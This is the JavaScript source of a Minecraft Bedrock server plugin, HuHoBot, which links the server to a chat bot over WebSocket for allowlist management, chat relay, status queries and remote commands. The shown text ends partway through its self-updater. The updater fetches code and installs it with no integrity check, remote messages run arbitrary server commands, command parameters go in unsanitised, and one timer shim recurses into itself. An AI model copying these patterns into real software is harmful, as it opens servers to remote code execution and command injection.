//LiteLoaderScript Dev Helper
// <reference path="E:\\MCServer\\HelperLib\\src\\index.d.ts"/> 

// 兼容性处理：使用LeviLamina提供的正确API
if (typeof clearTimeout === 'undefined') {
    clearTimeout = function(timerId) {
        if (timerId) {
            return clearInterval(timerId);  // 在LLSE中，clearInterval可以取消setTimeout和setInterval
        }
        return false;
    };
}

if (typeof clearInterval === 'undefined') {
    clearInterval = function(timerId) {
        if (timerId) {
            return clearInterval(timerId);  // 使用LLSE提供的clearInterval
        }
        return false;
    };
}

const UPDATEURL = "https://release.huhobot.txssb.cn/lse/HuHoBot-BDS-{VERSION}.js"
const LATESTURL = "https://release.huhobot.txssb.cn/lse/latest.json"
const VERSION = "0.3.2"
const CONFIG_VERSION = 5
const PLUGINNAME = 'HuHoBot'
const PATH = `plugins/${PLUGINNAME}/`
const CONFIGPATH = `${PATH}config.json`
const BLOCKPATH = `${PATH}blockMsg.json`
const BDSALLOWLISTPATH = "allowlist.json"

var WebsocketObject = null

let callbackEvent = {
    run: {},
    runAdmin: {}
}


logger.setTitle(PLUGINNAME)

/**
 * 读取文件
 * @param {string} file 
 * @returns 
 */
function readFile(file) {
    try {
        return JSON.parse(File.readFrom(file))
    } catch (_) {
        logger.error("文件读取出错，请尝试清空数据")
        return {}
    }
}

/**
 * 写入文件
 * @param {string} file 
 * @param {Object} data 
 * @returns 
 */
function writeFile(file, data) {
    return File.writeTo(file, JSON.stringify(data, null, '\t'))
}

/**
 * 分割数组
 * @param {Array} array 
 * @param {number} itemsPerPage 
 * @returns 
 */
function paginateArray(array, itemsPerPage) {
    let pages = [];
    try {
        for (let i = 0; i < array.length; i += itemsPerPage) {
            pages.push(array.slice(i, i + itemsPerPage));
        }
    } catch (_) {
        pages.push("白名单解析出现异常,请管理员检查白名单")
    }

    return pages;
}

/**
 * 数组搜索关键词
 * @param {Array} array 需要查询的数组
 * @param {string} keyword 关键词
 * @param {boolean} caseInsensitive 是否进行大小写不敏感的搜索
 * @returns 
 */
function filterByKeyword(array, keyword, caseInsensitive = true) {
    // 使用filter方法查询包含关键词的元素
    return array.filter(item => {
        // 如果需要大小写不敏感的搜索,将item和keyword都转换为小写
        if (caseInsensitive) {
            return item.toLowerCase().includes(keyword.toLowerCase());
        } else {
            return item.includes(keyword);
        }
    });
}

/**
 * 注册一个回调事件
 * @param {"run"|"runAdmin"} callType 
 * @param {string} keyWord 
 * @param {string} nameSpace 
 * @param {string} funcName 
 * @returns boolean 是否注册成功
 */
function regCallbackEvent(callType, keyWord, nameSpace, funcName) {
    if (!ll.hasExported(nameSpace, funcName)) {
        return false;
    }
    let func = ll.imports(nameSpace, funcName);
    if (Object.keys(callbackEvent).indexOf(callType) == -1) {
        return false
    }
    if (Object.keys(callbackEvent[callType]).indexOf(keyWord) != -1) {
        return false
    }
    callbackEvent[callType][keyWord] = func;
    logger.info(`注册${callType}类型事件: 关键词(${keyWord}) 回调函数(${nameSpace}::${funcName}) 成功`)
    return true
}

class FWebsocketClient {
    constructor(name, log) {
        this.name = name;
        this.log = log;
        let WSC = new WSClient();
        this.WSC = WSC;
        WSC.Open = 0;
        WSC.Closing = 1;
        WSC.Closed = 2;
        this.isShakeHand = false;
        this.tryConnect = false;
        
        // 多标签定时器管理系统 - 标签直接管理定时器
        this.timerLabels = {
            heart: null,                // 心跳定时器
            autoReconnect: null,        // 自动重连定时器
            connectTimeout: null,       // 连接超时定时器
            shakeHandTimeout: null,     // 握手超时定时器
            reconnection: [],           // 重连相关定时器组
            connection: [],             // 连接相关定时器组
            heartbeat: [],              // 心跳相关定时器组
        };

        //事件监听
        this.Events = {
            shaked: null,
            chat: null,
            success: null,
            add: null,
            delete: null,
            cmd: null,
            queryList: null,
            queryOnline: null,
            shutdown: null
        };

        this.bindMap = {}

        this._InitMsgProcess();
    }
    
    /**
     * 设置定时器并分配标签
     * @param {string} type 定时器类型 ('timeout' 或 'interval')
     * @param {Function} callback 定时器回调函数
     * @param {number} delay 延迟时间
     * @param {string|Array} labels 标签（可以是单个标签或标签数组）
     * @returns {number} 定时器ID
     */
    _setTimer(type, callback, delay, labels) {
        // 标准化标签为数组
        const labelArray = Array.isArray(labels) ? labels : [labels];
        
        // 创建定时器
        let timerId;
        if (type === 'interval') {
            timerId = setInterval(callback, delay);
        } else {
            timerId = setTimeout(callback, delay);
        }
        
        // 为每个标签分配定时器
        for (const label of labelArray) {
            if (Array.isArray(this.timerLabels[label])) {
                // 如果是数组类型的标签（多个定时器），则添加到数组
                this.timerLabels[label].push(timerId);
            } else {
                // 如果是单个定时器标签，则直接赋值
                this.timerLabels[label] = timerId;
            }
        }
        
        return timerId;
    }
    
    /**
     * 根据标签清除定时器
     * @param {string|Array} labels 要清除的标签（可以是单个标签或标签数组）
     */
    _clearTimerByLabels(labels) {
        const labelArray = Array.isArray(labels) ? labels : [labels];
        
        for (const label of labelArray) {
            if (this.timerLabels[label]) {
                if (Array.isArray(this.timerLabels[label])) {
                    // 如果是数组类型的标签，遍历并清除所有定时器
                    for (const timerId of this.timerLabels[label]) {
                        if (typeof timerId === 'number') {
                            // 在LeviLamina中，使用clearInterval来清除setTimeout和setInterval
                            clearInterval(timerId);
                        }
                    }
                    // 清空数组
                    this.timerLabels[label] = [];
                } else {
                    // 如果是单个定时器，直接清除
                    const timerId = this.timerLabels[label];
                    if (typeof timerId === 'number') {
                        // 在LeviLamina中，使用clearInterval来清除setTimeout和setInterval
                        clearInterval(timerId);
                    }
                    // 重置标签值
                    if (label === 'reconnection' || label === 'connection' || label === 'heartbeat') {
                        this.timerLabels[label] = []; // 数组类型的标签重置为空数组
                    } else {
                        this.timerLabels[label] = null; // 单个定时器标签重置为null
                    }
                }
            }
        }
    }
    
    /**
     * 清理所有定时器
     */
    _clearAllTimers() {
        // 遍历所有标签并清除定时器
        for (const label in this.timerLabels) {
            if (Array.isArray(this.timerLabels[label])) {
                // 清除数组中的所有定时器
                for (const timerId of this.timerLabels[label]) {
                    if (typeof timerId === 'number') {
                        clearInterval(timerId); // 在LLSE中使用clearInterval清除所有定时器
                    }
                }
                this.timerLabels[label] = [];
            } else if (this.timerLabels[label]) {
                // 清除单个定时器
                const timerId = this.timerLabels[label];
                if (typeof timerId === 'number') {
                    clearInterval(timerId); // 在LLSE中使用clearInterval清除所有定时器
                }
                this.timerLabels[label] = null;
            }
        }
    }

    /**
     * 连接服务器
     * @param {"nginx"|"direct"|"local"} connectLinkType 
     * @returns boolean 是否连接成功.
     */
    _Connect() {
        // 设置连接超时定时器，5秒后如果还未成功连接则超时
        this._clearTimerByLabels(['connectTimeout', 'connection']);
        this._setTimer('timeout', () => {
            // 检查握手是否已完成，如果已完成则不执行超时逻辑
            if (this.isShakeHand) {
                return; // 握手已完成，不执行超时逻辑
            }
            fastLog(`[HuHoBot] 服务端连接超时!`);
            this._handleConnectionError(true); // 触发重连机制
        }, 5000, ['connectTimeout', 'connection']); // 使用多标签：连接相关的定时器
        
        let isSuccess = this.WSC.connect(wsPath_Direct);
        if (isSuccess) {
            fastLog(`服务端连接成功!`);
            fastLog(`开始握手...`);
            // 在连接尝试成功且定时器已设置后，立即发送握手请求
            // 连接超时定时器将在握手成功后清除
            this._sendShakeHand();
        } else {
            fastLog(`正在连接服务端...`);  // 修改为连接中状态，而不是立即报告失败
            // 不清除超时定时器，让超时机制按计划执行
            // 连接失败会在定时器到期时被处理
        }
        return isSuccess;
    }

    /**
     * 重连服务器
     * @returns 
     */
    _ReConnect() {
        // 不调用 _Close()，因为它会清除一些需要在重连时保留的状态
        // 仅关闭 WebSocket 连接并重置状态
        this.isShakeHand = false;
        
        // 清除相关定时器
        this._clearTimerByLabels(['shakeHandTimeout', 'connectTimeout', 'autoReconnect']);
        
        if (this.WSC.status == this.WSC.Open) {
            this.WSC.close();
        }
        
        let config = readFile(CONFIGPATH);
        this.name = config.serverName;
        let isSuccess = this._Connect();
        return new Promise((cBack, _cErr) => {
            cBack(isSuccess);
        });
    }

    /**
     * 断开与服务器连接
     * @returns 
     */
    _Close() {
        this.isShakeHand = false;
        this.tryConnect = false;
        
        // 清除相关定时器
        this._clearTimerByLabels(['shakeHandTimeout', 'connectTimeout', 'autoReconnect', 'connection', 'reconnection']);
        
        if (this.WSC.status == this.WSC.Open) {
            return this.close(false);
        }
        return this.close(true);
    }

    /**
     * Websocket内置方法-设定监听消息
     */
    _InitMsgProcess() {
        let wsc = this.WSC;
        wsc.listen("onBinaryReceived", (data) => {
            fastLog("客户端不支持Binary消息!自动断开!");
            this._Close();
        });
        wsc.listen("onError", (msg) => {
            fastLog(`WSC出现异常: ${msg}`);
            // 检查是否允许自动重连
            let forceReconnect = msg.indexOf("select") >= 0 && this.tryConnect;
            this._handleConnectionError(forceReconnect);
        });

        wsc.listen("onLostConnection", (code) => {
            fastLog(`WSC服务器连接丢失!CODE: ${code}`);
            let allowErrorCode = [1000, 1006];
            // 检查是否允许自动重连，即使是一些允许的错误代码
            let forceReconnect = allowErrorCode.indexOf(code) >= 0 && this.tryConnect;
            this._handleConnectionError(forceReconnect);
        });
        wsc.listen("onTextReceived", (msg) => {
            try {
                let json = JSON.parse(msg);
                //log(json)
                this._processMessage(json.header, json.body);
            } catch (_) {
                fastLog(_)
                fastLog(`WSC无法解析接收到的字符串!`);
                fastLog(`重新尝试连接...`);
                this._setTimer('timeout', () => { 
                    // 检查是否允许自动重连
                    if (this.tryConnect) {
                        this._ReConnect();
                    }
                }, 5 * 1000, ['reconnection', 'errorHandling']);
            }
        });
    }

    /**
     * 处理连接错误
     */
    _handleConnectionError(forceReconnect = false) {
        // 清除相关定时器
        this._clearTimerByLabels(['heart', 'shakeHandTimeout', 'connectTimeout', 'connection', 'heartbeat']);

        // 如果是强制重连，但在 tryConnect 为 false 时不执行
        if (forceReconnect && !this.tryConnect) {
            // 不执行任何重连操作，只是返回
            return;
        }
        
        // 如果是强制重连，则设置 tryConnect 标志
        if (forceReconnect) {
            this.tryConnect = true;
        }

        if (!this.tryConnect && !forceReconnect) {
            fastLog("当前已取消自动重连，请检查后输入/huhobot reconnect重连");
            return;
        }

        // 检查是否已经在重连过程中，避免重复重连
        if (this.isReconnecting) {
            // 如果已经在重连过程中，不启动新的重连
            return;
        }
        
        fastLog("正在尝试自动重连...");
        this.isReconnecting = true; // 标记正在重连
        this._attemptReconnect();
    }

    /**
     * 自动重连
     */
    _attemptReconnect() {
        let reConnectCount = 0;
        const maxRetries = 5;
        const retryInterval = 5 * 1000; // 5秒

        const reConnect = () => {
            // 检查是否仍然允许自动重连
            if (!this.tryConnect) {
                this.isReconnecting = false;
                return; // 如果不允许自动重连，则停止重连
            }
            
            reConnectCount++;

            if (reConnectCount >= maxRetries) {
                fastLog(`已尝试${maxRetries}次自动重连失败，请检查后输入/huhobot reconnect重连`);
                this.isReconnecting = false; // 清除重连标记
                this.tryConnect = false;     // 停止自动重连，需要用户手动重连
                return;
            }

            this._setTimer('timeout', () => {
                this._ReConnect().then((success) => {
                    // 检查是否仍然允许自动重连
                    if (!this.tryConnect) {
                        this.isReconnecting = false;
                        return; // 如果不允许自动重连，则停止重连
                    }
                    
                    if (!success) {
                        fastLog(`第${reConnectCount}次重连失败，继续尝试...`);
                        reConnect();
                    } else {
                        this.isReconnecting = false; // 重连成功，清除重连标记
                    }
                });
            }, retryInterval, ['reconnectionRetry', 'reconnection']);
        };

        reConnect();
    }

    /**
     * 向服务器发送响应
     * @param {object} msg 
     * @param {Array} groupId 
     * @param {"success"|"error"} type 
     * @param {string} uuid 
     */
    _Respone(msg, groupId, type, uuid = "") {
        let config = readFile(CONFIGPATH)
        let callbackConvertImg = config.callbackConvertImg;
        this._sendMsg(type, { msg: msg, group: groupId, callbackConvert: callbackConvertImg }, uuid)
    }

    /**
     * 运行事件
     * @param {"shaked"|"chat"|"success"|"add"|"delete"|"cmd"|"queryList"|"queryOnline"|"shutdown"} type 
     * @param {string} id 
     * @param {object} body 
     */
    _runEvent(type, id, body) {
        if (this.Events[type] == null) {
            throw new Error(`事件[${type}]不存在!`);
        }
        try {
            let res = this.Events[type](id, body);
        } catch (e) {
            logger.error(`在运行事件[${type}]时遇到错误: ${e}\n${e.stack}`);
            if (type != "shutdown") {
                            logger.info(`正在重新连接...`);
                            this._setTimer('timeout', () => { this._ReConnect() }, 5 * 1000, ['reconnection', 'errorHandling']);            }
        }
    }

    /**
     * 消息处理
     * @param {{"type":string,"id":string}} header 
     * @param {object} body 
     */
    _processMessage(header, body) {
        if (header.id == null) {
            logger.info(`收到特殊消息: ${body.msg}, 正在尝试重新连接...`);
            this._setTimer('timeout', () => { this._ReConnect() }, 5 * 1000, ['reconnection', 'errorHandling']);
            return;
        }
        try {
            switch (header.type) {
                case "shaked": this.onShaked(header.id, body); break;
                case "chat": this.onChat(header.id, body); break;
                case "add": this.onAddAllowList(header.id, body); break;
                case "delete": this.onDelAllowList(header.id, body); break;
                case "cmd": this.onRunCmd(header.id, body); break;
                case "queryList": this.onQueryAllowList(header.id, body); break;
                case "queryOnline": this.onQueryOnline(header.id, body); break;
                case "shutdown": this.onShutDown(header.id, body); break;
                case "sendConfig": this.onSendConfig(header.id, body); break;
                case "run": this.onRun(header.id, body, header.type, false); break;
                case "runAdmin": this.onRun(header.id, body, header.type, true); break;
                case "bindRequest": this.onBindRequest(header.id, body, header.type); break;
            }
        } catch (e) {
            logger.error(`在处理消息是遇到错误: ${e.stack}`);
            logger.error(`此错误具有不可容错性!请检查插件是否为最新!`);
            logger.info(`正在断开连接...`);
            this._Close();
        }
    }

    _shakedProcess() {
        this.continueHeart = 0;
        this.isShakeHand = true;
        this.tryConnect = true;
        
        // 握手完成时清除握手超时定时器
        this._clearTimerByLabels(['shakeHandTimeout', 'connection']);
        
        // 握手成功，清除重连标记
        this.isReconnecting = false;
        
        this._clearTimerByLabels(['heart', 'heartbeat']); // 先清除可能存在的旧心跳定时器
        this._setTimer('interval', () => {
            this._sendMsg("heart", {})
        }, 5 * 1000, ['heart', 'heartbeat']); // 使用多标签

        //记录时间自己重连
        this._clearTimerByLabels(['autoReconnect', 'reconnection']); // 先清除可能存在的旧自动重连定时器
        this._setTimer('timeout', () => {
            // 检查是否允许自动重连
            if (!this.tryConnect) {
                return; // 如果不允许自动重连，则不执行
            }
            fastLog("连接超时，尝试自动重连...")
            let reConnectCount = 0;
            let reConnect = () => {
                reConnectCount++;
                if (reConnectCount >= 5) {
                    fastLog("已超过自动重连次数，请检查后输入/huhobot reconnect重连");
                } else {
                    // 添加到reconnection数组中
                    const retryTimer = this._setTimer('timeout', () => {
                        this._ReConnect().then((code) => {
                            if (!code) {
                                fastLog(`连接失败!重新尝试中...`);
                                reConnect();
                            }
                        });
                    }, 5 * 1000, ['reconnectionRetry', 'reconnection']);
                    this.timerLabels.reconnection.push(retryTimer); // 直接添加到reconnection数组

                }
            };
            reConnect();
        }, 6 * 60 * 60 * 1000, ['autoReconnect', 'reconnection']); // 使用多标签
    }

    /**
     * 发送消息
     * @param {"shaked"|"chat"|"success"|"add"|"delete"|"cmd"|"queryList"|"queryOnline"|"shutdown"} type 
     * @param {object} body 
     * @param {string} uuid 
     * @returns 
     */
    _sendMsg(type, body, uuid = system.randomGuid()) {
    
        // 只有在连接已关闭且握手已完成的情况下才不发送消息
        // 避免在连接断开后继续发送消息
        if (this.WSC.status === this.WSC.Closed && this.isShakeHand) {
            return;
        }
        
        // 在连接未打开且不是握手消息的情况下不发送消息
        if (this.WSC.status !== this.WSC.Open && type !== "shakeHand") {
            return;
        }
        
        let response = {
            "header": {
                "type": type,
                "id": uuid
            },
            "body": body
        }
        let jsonStr = JSON.stringify(response);
        this.WSC.send(jsonStr);
        //log(jsonStr)
    }

    /**
     * 向服务端握手
     */
    _sendShakeHand() {
        let config = readFile(CONFIGPATH)
        
        // 设置握手超时定时器，10秒后如果还未完成握手则超时
        this._clearTimerByLabels(['shakeHandTimeout', 'connection']);
        this._setTimer('timeout', () => {
            // 先检查握手是否已完成，如果已完成则不执行超时逻辑
            if (this.isShakeHand) {
                return; // 握手已完成，不执行超时逻辑
            }
            fastLog(`[HuHoBot] 握手超时!`);
            this._handleConnectionError(true); // 触发重连机制
        }, 10000, ['shakeHandTimeout', 'connection']); // 10秒超时，使用多标签
        
        this._sendMsg(
            "shakeHand",
            {
                serverId: config.serverId,
                hashKey: config.hashKey,
                name: this.name,
                version: VERSION,
                platform: "bds"
            }
        );
        
        fastLog(`开始握手...`);
    }

    /**
     * 回复消息
     * @param {string} msg 
     */
    _postChat(msg) {
        let serverId = readFile(CONFIGPATH).serverId
        this._sendMsg(
            "chat",
            {
                serverId: serverId,
                msg: msg
            }
        );
    }

    _bindConfirm(code) {
        let bindId = this.bindMap[code]
        this._sendMsg("bindConfirm", {}, bindId);
    }

    /**
     * 执行自定义命令
     * @param {string} id 
     * @param {object} body 
     * @param {string} type 
     */
    onBindRequest(id, body, type) {
        let bindCode = body.bindCode
        logger.info(`收到一个新的绑定请求，如确认绑定，请输入"/huhobot bind ${bindCode}"来进行确认`)
        this.bindMap[bindCode] = id
    }


    /**
     * 执行自定义命令
     * @param {string} id 
     * @param {object} body 
     * @param {string} type 
     * @param {boolean} isAdmin
     */
    onRun(id, body, type, isAdmin) {
        let keyWord = body.key;
        let params = body.runParams;

        //配置文件自定义命令
        let config = readFile(CONFIGPATH);
        let customCommand = config.customCommand;
        for (let i = 0; i < customCommand.length; i++) {
            let command = customCommand[i]
            if (command.key == keyWord) {
                //判断是否是管理员
                if (command.permission > 0 && !isAdmin) {
                    this._Respone(`权限不足，若您是管理员，请使用/管理员执行`, body.groupId, "error", id)
                    return;
                }
                //格式化参数
                let cmd = command.command;
                for (let j = 0; j < params.length; j++) {
                    let param = params[j]
                    cmd = cmd.replace(`&${j + 1}`, param)
                }
                //执行
                let outputCmd = mc.runcmdEx(cmd);
                if (outputCmd.success) {
                    this._Respone("执行成功:\n" + outputCmd.output, body.groupId, "success", id)
                } else {
                    this._Respone("执行失败:\n" + outputCmd.output, body.groupId, "error", id)
                }
                return;
            }
        }

        //插件自定义命令
        let data = JSON.stringify(body)
        if (Object.keys(callbackEvent[type]).indexOf(keyWord) != -1) {
            let ret = callbackEvent[type][keyWord](data)
            if (typeof ret === "string") {
                this._Respone(ret, body.groupId, "success", id)
            } else {
                throw new Error(`自定义命令返回值必须为字符串!`)
            }
            return;
        } else {
            let ret = (`未找到自定义命令:${keyWord}`)
            this._Respone(ret, body.groupId, "error", id)
        }



    }

    /**
     * 下发配置文件
     * @param {string} id 
     * @param {object} body 
     */
    onSendConfig(id, body) {
        //writeFile(CONFIGPATH, body);
        let serverId = body.serverId;
        let hashKey = body.hashKey;

        let config = readFile(CONFIGPATH);
        config.serverId = serverId
        config.hashKey = hashKey
        writeFile(CONFIGPATH, config);

        this._Respone(`服务器已接受下发配置文件`, body.groupId, "success", id)
        logger.info(`服务器已接受下发配置文件，正在自动重连，若重连失败请重启服务器`)
        logger.info(`正在重新连接...`);
        this._setTimer('timeout', () => { 
            // 检查是否允许自动重连
            if (this.tryConnect) {
                this._ReConnect();
            }
        }, 5 * 1000, ['reconnection', 'configUpdate']);
    }

    /**
     * 握手成功
     * @param {string} id 
     * @param {object} body 
     */
    onShaked(id, body) {
        let code = body.code;
        
        // 先设置握手状态，防止超时逻辑执行
        this.isShakeHand = true;
        
        // 握手完成时清除握手超时定时器
        this._clearTimerByLabels(['shakeHandTimeout', 'connection']);
        
        // 同时清除连接超时定时器，因为握手成功表明连接已建立
        this._clearTimerByLabels(['connectTimeout', 'connection']);
        
        switch (code) {
            case 1:
                fastLog(`握手完成!`);
                this._shakedProcess();
                break;
            case 2:
                fastLog(`握手完成!,附加消息:${body.msg}`);
                this._shakedProcess();
                break;
            case 3:
                fastLog(`握手失败!原因: ${body.msg}`);
                this.tryConnect = false;
                break;
            case 4:
                fastLog(`握手失败!原因: ${body.msg}`);
                fastLog(`正在尝试更新到最新版本...`)
                updateVersion();
                this.tryConnect = false;
                break;
            case 6:
                fastLog(`握手完成,等待绑定....`);
                this._shakedProcess()
                let config = readFile(CONFIGPATH)
                if (config.hashKey == null || config.hashKey == '') {
                    fastLog(`服务器尚未在机器人进行绑定，请在群内输入"/绑定 ${config.serverId}"来绑定`)
                }
                break;
            default:
                fastLog(`握手失败!原因: ${body.msg}`);
        }
    }

    /**
     * 聊天信息
     * @param {string} id 
     * @param {object} body 
     */
    onChat(id, body) {
        let config = readFile(CONFIGPATH)
        if (!config.chatFormat.post_chat) return; // 总开关关闭时不处理

        let chatMsg = "群:<{nick}> {msg}"
        if (config.chatFormat) {
            chatMsg = config.chatFormat.group
                .replace("{nick}", body.nick)
                .replace("{msg}", body.msg);
        }

        mc.broadcast(chatMsg)
    }

    /**
     * 添加白名单请求
     * @param {string} id 
     * @param {object} body 
     */
    onAddAllowList(id, body) {
        let outputAdd = mc.runcmdEx(`allowlist add ${body.xboxid}`)
        if (outputAdd.success) {
            this._Respone(`${this.name}已接受添加名为${body.xboxid}的白名单请求\n返回如下:${outputAdd.output}`, body.groupId, "success", id)
        } else {
            this._Respone(`${this.name}已拒绝添加名为${body.xboxid}的白名单请求\n返回如下:${outputAdd.output}`, body.groupId, "error", id)
        }
    }

    /**
     * 删除白名单请求
     * @param {string} id 
     * @param {object} body 
     */
    onDelAllowList(id, body) {
        let outputDel = mc.runcmdEx(`allowlist remove ${body.xboxid}`);
        if (outputDel.success) {
            this._Respone(`${this.name}已接受删除名为${body.xboxid}的白名单请求\n返回如下:${outputDel.output}`, body.groupId, "success", id)
        } else {
            this._Respone(`${this.name}已拒绝删除名为${body.xboxid}的白名单请求\n返回如下:${outputDel.output}`, body.groupId, "success", id)
        }

    }

    /**
     * 执行命令请求
     * @param {string} id 
     * @param {object} body 
     */
    onRunCmd(id, body) {
        let outputCmd = mc.runcmdEx(body.cmd);
        if (outputCmd.success) {
            this._Respone("执行成功:\n" + outputCmd.output, body.groupId, "success", id)
        } else {
            this._Respone("执行失败:\n" + outputCmd.output, body.groupId, "error", id)
        }
    }

    /**
     * 查询白名单请求
     * @param {string} id 
     * @param {object} body 
     */
    onQueryAllowList(id, body) {
        let BDSAllowlist = {}
        try {
            BDSAllowlist = readFile(BDSALLOWLISTPATH)
        } catch (err) {
            logger.error("读取白名单文件失败,请检查白名单文件是否正确!")
            logger.error(err)
            this._sendMsg("queryWl", { "list": "读取白名单文件失败,请检查白名单文件是否正确!" }, id)
            return;
        }

        let nameList = []
        for (let i = 0; i < BDSAllowlist.length; i++) {
            nameList.push(BDSAllowlist[i]["name"]);
        }

        if ('key' in body) {
            if (body.key.length < 2) {
                let allowlistNameString = `查询白名单关键词:${body.key}结果如下:\n`
                allowlistNameString += '请使用两个字母及以上的关键词进行查询!'
                this._sendMsg("queryWl", { "list": allowlistNameString }, id)
                return;
            }
            let allowlistNameString = `查询白名单关键词:${body.key}结果如下:\n`
            let filterList = filterByKeyword(nameList, body.key)
            if (filterList.length == 0) {
                allowlistNameString += '无结果'
            } else {
                for (let i = 0; i < filterList.length; i++) {
                    allowlistNameString += filterList[i] + "\n";
                }
                allowlistNameString += `共有${filterList.length}个结果`
            }

            this._sendMsg("queryWl", { "list": allowlistNameString }, id)
        }
        else if ('page' in body) {
            let allowlistNameString = "服内白名单如下:\n"
            let splitedNameList = paginateArray(nameList, 10)
            let firstNameList = splitedNameList[body.page - 1]
            if (body.page - 1 > splitedNameList.length) {
                allowlistNameString += `没有该页码\n`
                allowlistNameString += `共有${splitedNameList.length}页\n请使用/查白名单 {页码}来翻页`
            } else {
                for (let i = 0; i < firstNameList.length; i++) {
                    allowlistNameString += firstNameList[i] + "\n";
                }
                allowlistNameString += `共有${splitedNameList.length}页，当前为第${body.page}页\n请使用/查白名单 {页码}来翻页`
            }

            this._sendMsg("queryWl", { "list": allowlistNameString }, id)
        }
        else {
            let allowlistNameString = "服内白名单如下:\n"
            let splitedNameList = paginateArray(nameList, 10)
            let firstNameList = splitedNameList[0]
            for (let i = 0; i < firstNameList.length; i++) {
                allowlistNameString += firstNameList[i] + "\n";
            }
            allowlistNameString += `共有${splitedNameList.length}页，当前为第${1}页\n请使用/查白名单 {页码}来翻页`
            this._sendMsg("queryWl", { "list": allowlistNameString }, id)
        }

    }

    /**
     * 查询在线列表请求
     * @param {string} id 
     * @param {object} body 
     */
    onQueryOnline(id, body) {
        let config = readFile(CONFIGPATH)

        let server_ip = config.motd.server_ip;
        let server_port = config.motd.server_port;
        let api = config.motd.api;
        let text = config.motd.text
        let output_online_list = config.motd.output_online_list;
        let post_img = config.motd.post_img;

        //拼接在线列表
        let onlineNameString = ""
        let online = mc.getOnlinePlayers();
        if (output_online_list) {
            for (let i = 0; i < online.length; i++) {
                let simulated = ""
                if (online[i].isSimulatedPlayer() && config.addSimulatedPlayerTip) {
                    simulated = "(假人)"
                }
                onlineNameString += online[i].name + simulated;
                onlineNameString += "\u200B"
            }
        }
        text = text.replace("{online}", online.length)
        onlineNameString += text

        this._sendMsg("queryOnline", {
            "list": {
                "msg": onlineNameString,
                "url": `${server_ip}:${server_port}`,
                "imgUrl": api.replace("{server_ip}", server_ip).replace("{server_port}", server_port),
                "post_img": post_img,
                "serverType": "bedrock",
            }
        }, id)
    }

    /**
     * 服务端断开连接
     * @param {string} id 
     * @param {object} body 
     */
    onShutDown(id, body) {
        this.tryConnect = false
        logger.error(`服务端命令断开连接 原因:${body.msg}`);
        logger.error(`此错误具有不可容错性!请检查插件配置文件!`);
        logger.info(`正在断开连接...`);
        this._Close();
    }

    /**
     * 监听事件
     * @param {"shaked"|"chat"|"success"|"add"|"delete"|"cmd"|"queryList"|"queryOnline"|"shutdown"|"bindRequest"} event 
     * @param {(id: string, body: object)=>{}} func 
     * @returns 
     */
    listen(event, func) {
        if (this.Events[event] == null) {
            this.Events[event] = func;
        } else {
            throw new Error(`重复监听事件${event}`)
        }

        return true;
    }

    /**
     * 关闭客户端连接
     * @param {boolean} bool 
     * @returns 
     */
    close(bool = false) {
        this.isShakeHand = false;
        if (!bool) {
            return this.WSC.close();
        }
        return true;
    }
}

/**
 * 初始化WebSocket服务
 */
function initWebsocketServer() {
    let config = readFile(CONFIGPATH)
    let ws = new FWebsocketClient(config.serverName, logger,)
    fastLog(`正在连接${PLUGINNAME}服务端...`)
    ws._Connect();
    return ws;
}

/**
 * 注册命令
 * @param {FWebsocketClient} ws 
 */
function regCommand(ws) {
    const cmd = mc.newCommand("huhobot", `${PLUGINNAME}管理`, PermType.Any);
    cmd.setEnum("NormalAction", ["reconnect", "close", "help", "update"]);
    cmd.setEnum("BindAction", ["bind"])
    cmd.mandatory("naction", ParamType.Enum, "NormalAction", 1);
    cmd.mandatory("baction", ParamType.Enum, "BindAction", 1);
    cmd.mandatory("bindcode", ParamType.RawText);
    cmd.overload(["naction"]);
    cmd.overload(["baction", "bindcode"]);
    cmd.overload([]);


    cmd.setCallback((_cmd, _ori, out, res) => {
        let type = res.naction || res.baction || "help"
        switch (type) {
            case "reconnect":
                if (_ori.player == null || _ori.player.permLevel > 0) {
                    if (ws.WSC.status == ws.WSC.Open) {
                        ws._Close()
                    }
                    ws._Connect();
                    out.error(`[${PLUGINNAME}]Websocket 正在重连`)
                } else {
                    out.error("权限不足.")
                    return;
                }
                break;
            case "close":
                if (_ori.player == null || _ori.player.permLevel > 0) {
                    if (ws.WSC.status == ws.WSC.Closed) {
                        out.error(`[${PLUGINNAME}]Websocket 处于未连接状态，无须断开`)
                    } else {
                        ws._Close()
                        out.error(`[${PLUGINNAME}]Websocket 已断开`)
                        return;
                    }
                } else {
                    out.error("权限不足.")
                    return;
                }
                break;
            case "bind":
                let bindCode = res.bindcode.toString()
                if (Object.keys(ws.bindMap).indexOf(bindCode) != -1) {
                    ws._bindConfirm(bindCode)
                    out.success("已向服务器发送确认绑定请求，请等待服务端下发配置文件.")
                } else {
                    out.error("未找到该绑定码,若检查绑定码正确,可尝试重新绑定.")
                    return;
                }

                break
            case "update":
                if (_ori.player == null) {
                    updateVersion();
                } else {
                    out.error("此命令无法在玩家终端执行!");
                }
                break;
            case "help":
                out.success("HuHoBot 帮助列表:");
                out.success("- /huhobot reload: 重载配置文件");
                out.success("- /huhobot reconnect: 重新连接");
                out.success("- /huhobot disconnect: 断开服务器连接");
                out.success("- /huhobot bind <bindCode:str>: 绑定服务器");
                out.success("- /huhobot update: 更新插件版本");
                out.success("- /huhobot help: 显示帮助列表");
                break
            default:
                out.error("未知命令.")
                break;
        }
    });
    cmd.setup();
}

function convertConfig() {
    const oldConfigVersion = CONFIG_VERSION - 1;
    try {
        // 备份当前配置
        const oldConfig = readFile(CONFIGPATH);
        writeFile(`${PATH}config_v${oldConfigVersion}_backup.json`, oldConfig);
        logger.info(`配置文件已备份为 config_v${oldConfigVersion}_backup.json`);

        // 创建新配置结构
        const newConfig = {
            ...oldConfig,
            callbackConvertImg: 0,
            version: CONFIG_VERSION
        };

        // 写入新配置
        writeFile(CONFIGPATH, newConfig);
        logger.info(`配置文件已由 v${oldConfigVersion} 升级为 v${CONFIG_VERSION}`);

    } catch (error) {
        logger.error(`配置文件v${oldConfigVersion}转至v${CONFIG_VERSION}失败:`, error.message);
    }
}

//自动更新
function updateVersion() {
    network.httpGet(LATESTURL, (statusCode, result) => {
        if (statusCode == 200) {
            let latestVersion = JSON.parse(result).latest
            if (latestVersion != "v" + VERSION) {
                network.httpGet(UPDATEURL.replace("{VERSION}", latestVersion), (statusCode, result) => {
                    if (statusCode == 200) {
                        const normalizedResult = result.replace(/\r\n/g, '\n');
                        File.writeTo(PATH + "huhobot.js", normalizedResult)
                        //尝试重载
                        logger.info(`HuHoBot已更新至${latestVersion}，已尝试重载插件，若未生效，请重启服务器.`)
                        mc.runcmd(`ll reload HuHoBot`)
                    }
                })
            } else {
